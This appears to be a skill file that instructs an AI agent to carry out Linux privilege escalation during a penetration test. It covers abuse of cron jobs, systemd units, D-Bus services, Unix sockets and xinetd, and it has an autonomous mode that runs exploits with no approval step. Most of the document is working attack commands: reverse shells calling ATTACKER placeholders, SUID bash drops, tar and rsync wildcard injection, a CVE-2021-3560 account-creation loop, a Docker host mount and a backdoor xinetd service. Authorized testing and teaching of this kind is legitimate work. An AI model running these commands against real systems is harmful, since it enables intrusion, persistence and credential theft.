---
name: linux-cron-service-abuse
description: >
  Exploit cron jobs, systemd timers/services, D-Bus services, and Unix sockets
  for privilege escalation.
keywords:
  - cron privesc
  - wildcard injection
  - systemd abuse
  - dbus exploit
  - pspy found root process
  - writable cron script
  - polkit bypass
  - pwnkit
tools:
  - pspy
  - busctl
  - gdbus
  - dbus-send
  - systemctl
  - crontab
opsec: medium
---

# Linux Cron, Service, and D-Bus Exploitation

You are helping a penetration tester exploit scheduled tasks, services, and inter-process
communication mechanisms for privilege escalation. All testing is under explicit written
authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present it and wait for user approval. Explain each technique before
  executing. Show expected output. Ask before modifying cron/service files.
- **Autonomous**: Execute the most reliable technique. Monitor for execution with pspy.
  Report results at each stage. Only pause before destructive modifications.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically.

When an engagement directory exists, log as you work:
- **Activity** → append to `engagement/activity.md` at milestones:
  `### [YYYY-MM-DD HH:MM:SS] linux-cron-service-abuse → <hostname>` with actions and results.
- **Findings** → append to `engagement/findings.md` when escalation succeeds.
- **Evidence** → save proof to `engagement/evidence/` (e.g., `cron-root-shell.txt`,
  `dbus-exploit-output.txt`).

### Invocation Log

Immediately on activation — before reading state.md or doing any assessment —
log invocation to both the screen and activity.md:

1. **On-screen**: Print `[linux-cron-service-abuse] Activated → <target>` so the operator
   sees which skill is running.
2. **activity.md**: Append:
   ```
   ### [YYYY-MM-DD HH:MM:SS] linux-cron-service-abuse → <target>
   - Invoked (assessment starting)
   ```

**Timestamps:** Replace `[YYYY-MM-DD HH:MM:SS]` with the actual current date
and time. Run `date '+%Y-%m-%d %H:%M:%S'` to get it. Never write the literal
placeholder `[YYYY-MM-DD HH:MM:SS]` — activity.md entries need real timestamps
with date and second precision for timeline reconstruction.

This entry must be written NOW, not deferred. Subsequent milestone entries
append bullet points under this same header.


## State Management

If `engagement/state.md` exists, read it before starting. Use it to:
- Check what cron/service findings were identified by linux-discovery
- Leverage existing access or credentials
- Skip techniques already tried (Blocked section)

Write `engagement/state.md` at these checkpoints (not just at completion):
1. **After confirming a vulnerability** — add to Vulns with `[found]`
2. **After successful exploitation** — add credentials, access, pivot paths
3. **Before routing to another skill** — the next skill reads state.md on activation

At each checkpoint and on completion, update the relevant sections of
`engagement/state.md`:
- **Credentials**: Add any new credentials discovered
- **Access**: Update access level (e.g., root shell obtained)
- **Vulns**: Mark exploited vectors `[done]`
- **Pivot Map**: Document escalation path used

## Prerequisites

- Shell access on Linux target
- At least one of: writable cron script, wildcard in cron command, writable systemd
  unit, exploitable D-Bus service, writable Unix socket
- pspy recommended for discovering hidden scheduled tasks

## Step 1: Assess Scheduled Task and Service Landscape

If not already provided by linux-discovery, enumerate:

```bash
# Cron jobs
crontab -l 2>/dev/null
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ 2>/dev/null
cat /etc/cron.d/* 2>/dev/null

# Systemd timers and services
systemctl list-timers --all --no-pager 2>/dev/null
systemctl list-units --type=service --state=running --no-pager 2>/dev/null

# Process monitoring (leave running)
./pspy64 -pf -i 1000
```

Classify findings and proceed to the relevant section below.

## Step 2: Cron Job Exploitation

### Writable Cron Script

If a root cron job executes a script you can modify:

```bash
# Verify write access
ls -la /path/to/cron_script.sh

# Option 1: SUID bash (persistent)
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4755 /tmp/rootbash' > /path/to/cron_script.sh
chmod +x /path/to/cron_script.sh

# Wait for cron execution, then:
/tmp/rootbash -p
```

```bash
# Option 2: Reverse shell (immediate access)
echo '#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' > /path/to/cron_script.sh
chmod +x /path/to/cron_script.sh
# Start listener: nc -lvnp PORT
```

```bash
# Option 3: Append to existing script (stealthier)
echo '' >> /path/to/cron_script.sh
echo 'cp /bin/bash /tmp/.rootbash && chmod 4755 /tmp/.rootbash' >> /path/to/cron_script.sh
```

### PATH Manipulation in Cron

If a cron job calls a binary without a full path:

```bash
# Example crontab entry:
# * * * * * root backup_script

# Check cron PATH (first line of /etc/crontab)
head -5 /etc/crontab
# Default: PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Find a writable directory that appears before the real binary in PATH
echo $PATH | tr ':' '\n' | while read d; do [ -w "$d" ] && echo "WRITABLE: $d"; done

# Create hijack binary in writable PATH directory
cat > /writable/path/backup_script << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
# Run original to avoid breaking things
/usr/bin/backup_script "$@"
EOF
chmod +x /writable/path/backup_script
```

### Writable Cron Directory Injection

If you can write to cron directories:

```bash
# Direct injection to /etc/cron.d/ (if writable)
cat > /etc/cron.d/exploit << 'EOF'
* * * * * root /bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash'
EOF

# Or via crontab command (user crontab)
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'") | crontab -
```

**Important:** Cron files in `/etc/cron.d/` must have correct permissions (644, owned
by root) or they may be ignored. User crontabs via `crontab -e` don't have this
restriction.

## Step 3: Wildcard Injection

When a root-owned cron job or script uses wildcards (`*`) in commands, you can inject
arguments via specially-named files.

### Tar Checkpoint Injection

**Target pattern:** `tar czf backup.tar.gz *` or `tar czf backup.tar.gz /path/*`

```bash
# Navigate to the directory where tar runs with wildcards
cd /path/to/target_directory

# Create payload script
cat > shell.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
chmod +x shell.sh

# Create checkpoint injection files
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'

# When root's cron runs: tar czf backup.tar.gz *
# The * expands to include --checkpoint=1 and --checkpoint-action=exec=sh shell.sh
# tar executes shell.sh as root
```

**Wait for execution, then:** `/tmp/rootbash -p`

### Chown/Chmod Reference File Injection

**Target pattern:** `chown -R user:group *` or `chmod -R 755 *`

```bash
cd /path/to/target_directory

# Create reference file that points to a file with desired ownership
touch -- '--reference=/etc/passwd'
# When root runs: chown nobody:nobody *
# The --reference flag overrides and sets ownership to match /etc/passwd (root:root)
```

### Rsync Shell Injection

**Target pattern:** `rsync -az * backup:/dest/`

```bash
cd /path/to/target_directory
touch -- '-e sh shell.sh'
# When rsync processes *, the -e flag specifies a shell command
```

### 7-Zip File List Exfiltration

**Target pattern:** `7za a backup.7z *`

```bash
cd /path/to/target_directory
ln -s /etc/shadow shadow.txt
touch @shadow.txt
# 7z interprets @file as "read filenames from file"
# Contents of /etc/shadow printed to stderr
```

### Zip Test Injection

**Target pattern:** `zip out.zip *`

```bash
cd /path/to/target_directory
touch -- '-T'
touch -- '-TT sh shell.sh'
# zip -T runs a test, -TT specifies the test command
```

## Step 4: Systemd Timer and Service Exploitation

### Writable Service Files

```bash
# Find writable unit files
find /etc/systemd/system /usr/lib/systemd/system /lib/systemd/system -writable -type f 2>/dev/null

# Check specific service file permissions
ls -la /etc/systemd/system/<service>.service
```

**Modify ExecStart to inject payload:**

```bash
# Backup original (for cleanup)
cp /etc/systemd/system/target.service /tmp/target.service.bak

# Option 1: Replace ExecStart
sed -i 's|ExecStart=.*|ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash \&\& chmod 4755 /tmp/rootbash"|' /etc/systemd/system/target.service

# Option 2: Add ExecStartPre for stealth (runs before main service)
sed -i '/\[Service\]/a ExecStartPre=/bin/bash -c "cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash"' /etc/systemd/system/target.service
```

```bash
# Reload and trigger
systemctl daemon-reload
systemctl restart target.service   # If you have permission to restart
# Otherwise wait for next boot or timer trigger
```

### Writable Timer Files

```bash
# If a timer file is writable, modify to trigger frequently
cat > /etc/systemd/system/exploit.timer << 'EOF'
[Unit]
Description=Exploit Timer

[Timer]
OnCalendar=*:*:00
Unit=exploit.service

[Install]
WantedBy=timers.target
EOF

cat > /etc/systemd/system/exploit.service << 'EOF'
[Unit]
Description=Exploit Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash'
EOF

systemctl daemon-reload
systemctl enable --now exploit.timer
```

### Systemd PATH Hijack

```bash
# Check systemd environment PATH
systemctl show-environment | grep PATH

# If a service uses a relative binary path in ExecStart:
# ExecStart=myservice --flag
# And you can write to a directory in the systemd PATH before the real location:
echo '#!/bin/bash' > /writable/path/myservice
echo 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' >> /writable/path/myservice
echo '/usr/bin/myservice "$@"' >> /writable/path/myservice
chmod +x /writable/path/myservice
```

### Service Binary Replacement

```bash
# If the binary specified in ExecStart is writable
ls -la /path/to/service_binary

# Replace with payload (backup first)
cp /path/to/service_binary /tmp/service_binary.bak
cat > /path/to/service_binary << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
/tmp/service_binary.bak "$@"  # Run original
EOF
chmod +x /path/to/service_binary
```

## Step 5: D-Bus Service Exploitation

### D-Bus Enumeration

```bash
# List system bus services
busctl list 2>/dev/null

# Get service details (PID, UID — look for root-owned)
busctl status <service.name> 2>/dev/null

# List objects and interfaces
busctl tree <service.name> 2>/dev/null

# Introspect methods (find callable functions)
busctl introspect <service.name> /object/path 2>/dev/null

# Monitor D-Bus traffic
dbus-monitor --system 2>/dev/null &
```

**Look for:**
- Services running as root (UID=0 in `busctl status`)
- Methods that accept string parameters (command injection potential)
- Missing PolicyKit authorization checks
- Services with overly permissive D-Bus policies

```bash
# Check D-Bus policies for permissive rules
grep -rn 'allow' /etc/dbus-1/system.d/ /usr/share/dbus-1/system.d/ 2>/dev/null | grep -E 'send_destination|own'
```

### D-Bus Command Injection

If a root-owned D-Bus service passes user input to `system()`, `popen()`, or similar:

```bash
# Using dbus-send
dbus-send --system --print-reply --dest=<service.name> /object/path \
  <interface.name>.<MethodName> string:';cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash #'

# Using gdbus
gdbus call -y -d <service.name> -o /object/path \
  -m <interface.name>.<MethodName> ';bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1" #'

# Using busctl
busctl call <service.name> /object/path <interface.name> <MethodName> s \
  ';cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash #'
```

**Python D-Bus exploitation:**

```python
import dbus

bus = dbus.SystemBus()
obj = bus.get_object('<service.name>', '/object/path')
iface = dbus.Interface(obj, dbus_interface='<interface.name>')

# Command injection via string parameter
payload = ';bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1" #'
iface.MethodName(payload)
```

### PolicyKit / Polkit Bypass

#### CVE-2021-4034 (PwnKit) — pkexec Local Privilege Escalation

**Affected:** PolicyKit pkexec < 0.120 (virtually all Linux distributions before
Jan 2022 patches).

```bash
# Check version
pkexec --version

# Multiple public exploits:
# https://github.com/ly4k/PwnKit
# https://github.com/arthepsy/CVE-2021-4034

# Quick check (Python PoC)
python3 -c '
import ctypes, os, struct, sys

libc = ctypes.CDLL("libc.so.6")
libc.execve.argtypes = [ctypes.c_char_p, ctypes.POINTER(ctypes.c_char_p), ctypes.POINTER(ctypes.c_char_p)]

# Exploit uses empty argv to trigger out-of-bounds write
# See public PoCs for full implementation
'
```

**Compiled exploits are more reliable** — transfer a pre-compiled PwnKit binary.

#### CVE-2021-3560 — Polkit D-Bus Authentication Bypass

**Affected:** Polkit 0.113 - 0.118 (Ubuntu 20.04, RHEL 8, Fedora 21+).

```bash
# Trigger: send D-Bus request and kill it at the right moment
# The timing window causes polkit to authorize the request

# Create user with sudo privileges
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call \
  --print-reply /org/freedesktop/Accounts \
  org.freedesktop.Accounts.CreateUser string:hacker string:"Hacker" int32:1 &
# Kill after ~10-20ms
sleep 0.01 && kill $!

# Set password for new user
HASHED=$(openssl passwd -6 password123)
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call \
  --print-reply /org/freedesktop/Accounts/User1001 \
  org.freedesktop.Accounts.User.SetPassword string:"$HASHED" string:"" &
sleep 0.01 && kill $!

# Login as new user
su - hacker  # password: password123
sudo bash
```

**Note:** Timing-dependent — may need multiple attempts. Loop until it works:

```bash
for i in $(seq 1 100); do
  dbus-send --system --dest=org.freedesktop.Accounts --type=method_call \
    --print-reply /org/freedesktop/Accounts \
    org.freedesktop.Accounts.CreateUser string:hacker string:"" int32:1 &
  sleep 0.008
  kill $! 2>/dev/null
done
```

### Recent D-Bus CVEs

| CVE | Component | Impact | Exploitation |
|-----|-----------|--------|-------------|
| CVE-2024-45752 | logiops <=0.3.4 | Macro injection via LoadConfig | `gdbus call -y -d org.freedesktop.Logiopsd -o /org/freedesktop/Logiopsd -m org.freedesktop.Logiopsd.LoadConfig "/tmp/evil.yml"` |
| CVE-2025-23222 | Deepin dde-api-proxy <=1.0.18 | All D-Bus calls treated as UID 0 | Any method call via proxy runs as root |
| CVE-2025-3931 | yggdrasil <=0.4.6 | Arbitrary RPM install via Dispatch | `dbus-send` to `com.redhat.yggdrasil` Dispatch method |

## Step 6: Unix Socket Exploitation

### Socket Enumeration

```bash
# List Unix sockets
ss -lx 2>/dev/null || netstat -a -p --unix 2>/dev/null
find / -type s 2>/dev/null

# Check permissions (writable = exploitable)
find / -type s -writable 2>/dev/null

# Identify socket owners (root-owned = high value)
ls -la /var/run/*.sock /tmp/*.sock /tmp/*.s 2>/dev/null
```

### Socket Command Injection

If a root-owned socket accepts commands without authentication:

```bash
# Test with socat
echo "id" | socat - UNIX-CLIENT:/path/to/socket

# Inject payload
echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash; chmod +x /tmp/rootbash;" | \
  socat - UNIX-CLIENT:/path/to/socket
```

```bash
# Using nc (if Unix socket support available)
echo ';bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1" #' | nc -U /path/to/socket

# Using curl (for HTTP-based sockets)
curl --unix-socket /path/to/socket http://localhost/api/exec -d '{"cmd":"id"}'
```

### Docker Socket Exploitation

If `/var/run/docker.sock` is writable (docker group membership):

```bash
# Verify access
docker ps 2>/dev/null

# Mount host filesystem
docker run -v /:/host -it alpine chroot /host bash

# If docker CLI not available, use curl
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
curl -s --unix-socket /var/run/docker.sock -X POST \
  "http://localhost/containers/create" \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"],"Privileged":true}'
```

**Note:** Docker socket exploitation is also covered in **linux-file-path-abuse** with
additional group-based escalation paths.

## Step 7: Init Script and At Job Exploitation

### Writable Init Scripts

```bash
# Find writable init scripts
find /etc/init.d -writable -type f 2>/dev/null
ls -la /etc/rc.local 2>/dev/null

# Inject into writable init script
echo '' >> /etc/init.d/writable_service
echo '/bin/bash -c "cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash"' >> /etc/init.d/writable_service

# Inject into rc.local (if writable, runs at boot)
echo 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' >> /etc/rc.local
chmod +x /etc/rc.local
```

### Xinetd Service Injection

```bash
# If /etc/xinetd.d/ is writable
cat > /etc/xinetd.d/backdoor << 'EOF'
service backdoor
{
    port        = 9999
    socket_type = stream
    protocol    = tcp
    wait        = no
    user        = root
    server      = /bin/bash
    server_args = -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"
    disable     = no
}
EOF

# Add to /etc/services if needed
echo "backdoor 9999/tcp" >> /etc/services

# Restart xinetd
systemctl restart xinetd 2>/dev/null || service xinetd restart 2>/dev/null
```

### At Job Exploitation

```bash
# Schedule command (if at is available and allowed)
echo 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' | at now + 1 minute

# Check at restrictions
cat /etc/at.allow 2>/dev/null
cat /etc/at.deny 2>/dev/null

# List pending at jobs
atq 2>/dev/null
```

### Anacron Exploitation

```bash
# Check anacron config
cat /etc/anacrontab 2>/dev/null

# If anacron runs writable scripts in /etc/cron.daily/ etc.
# Same exploitation as writable cron scripts (Step 2)
```

## Step 8: Escalate or Pivot

### Reverse Shell via MCP

When cron/service abuse achieves code execution as root, **catch the escalated
shell via the MCP shell-server** rather than polling for SUID bash or waiting
on a local listener. Cron and service payloads execute asynchronously -- a
reverse shell lets you catch the callback the moment the job fires.

1. Call `start_listener(port=4444)` to prepare a catcher on the attackbox
2. Write a reverse shell into the cron job or service payload:
   ```bash
   # Writable cron script:
   echo '#!/bin/bash
   bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' > /path/to/cron_script.sh
   # Or inject into systemd ExecStart:
   ExecStart=/bin/bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"
   ```
3. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
4. Verify the new privilege level with `send_command(session_id=..., command="id")`

If the target lacks outbound connectivity, use the SUID bash approach
(`cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash`) as the cron/service
payload and access it through an existing shell session.

**Before routing**: Write `engagement/state.md` and append to
`engagement/activity.md` with results so far. The next skill reads state.md
on activation — stale state means duplicate work or missed context.

After obtaining root:

- **Root shell via cron/service** (persistent): The escalation vector may re-trigger
  periodically. Clean up SUID bash copies and injected scripts when done.
- **Credentials found**: Extract from root-accessible files (/etc/shadow,
  application configs) and add to engagement state.
- **Need AD credentials**: Check for cached Kerberos tickets, SSSD cache, or
  domain secrets → route to AD skills.
- **Pivot needed**: Use elevated access for network pivoting, credential harvesting.

**Cleanup reminders:**
- Remove injected cron entries from `/etc/cron.d/`
- Restore modified service files from backups
- Remove SUID bash copies (`/tmp/rootbash`)
- Remove checkpoint injection files (`--checkpoint=*`)
- Restore original scripts from backups

When routing, pass along: hostname, escalation method used, current access level,
credentials obtained, current mode.

## Stall Detection

If you have spent **5 or more tool-calling rounds** troubleshooting the same
failure with no meaningful progress — same error, no new information gained,
no change in output — **stop**.

Retrying a command with adjusted syntax, different flags, or additional context
counts as progress. Stalling means repeating the same approach and getting the
same result.

Do not loop. Work through failures systematically:
1. Try each variant or alternative **once**
2. Check the Troubleshooting section for known fixes
3. If nothing changes the outcome after 5 rounds, you are stalled

**When stalled, return to the orchestrator immediately with:**
- What was attempted (commands, variants, alternatives tried)
- What failed and why (error messages, empty responses, timeouts)
- Assessment: **blocked** (permanent — config, patched, missing prereq) or
  **retry-later** (may work with different context, creds, or access)
- Update `engagement/state.md` Blocked section before returning

**Mode behavior:**
- **Guided**: Tell the user you're stalled, present what was tried, and
  recommend the next best path.
- **Autonomous**: Update state.md Blocked section, return findings to the
  orchestrator. Do not retry the same technique — the orchestrator will
  decide whether to revisit with new context or route elsewhere.

## Troubleshooting

### Cron job doesn't fire
Check cron daemon is running: `systemctl status cron 2>/dev/null || systemctl status crond`.
Verify cron file permissions (644 for /etc/cron.d/ files). Check cron logs:
`grep CRON /var/log/syslog` or `journalctl -u cron`. Use pspy to monitor.

### Wildcard injection files not expanding
File names must be exact (including dashes): `touch -- '--checkpoint=1'`. The `--`
tells touch to stop processing options. Verify with `ls -la` that filenames start
with `--`. Also verify the cron command actually uses `*` glob expansion (not a
quoted path).

### D-Bus method returns "not authorized"
PolicyKit is blocking. Check polkit rules in `/usr/share/polkit-1/rules.d/` and
`/etc/polkit-1/rules.d/`. Consider CVE-2021-3560 timing attack if polkit version
is vulnerable. Some services have custom auth — check the service's D-Bus policy
file in `/etc/dbus-1/system.d/`.

### Systemd daemon-reload requires root
If you cannot `systemctl daemon-reload`, modifications to service files won't take
effect until the next reboot or until a root process reloads systemd. Timer and
service modifications that don't require reload: modifying the script/binary that
ExecStart points to (not the unit file itself).

### Socket not accepting connections
Check socket type (`SOCK_STREAM` vs `SOCK_DGRAM`) and use the correct tool.
For datagram sockets: `socat - UNIX-SENDTO:/path/to/socket`. Verify the socket
is actively listening: `ss -lx | grep socket_name`.
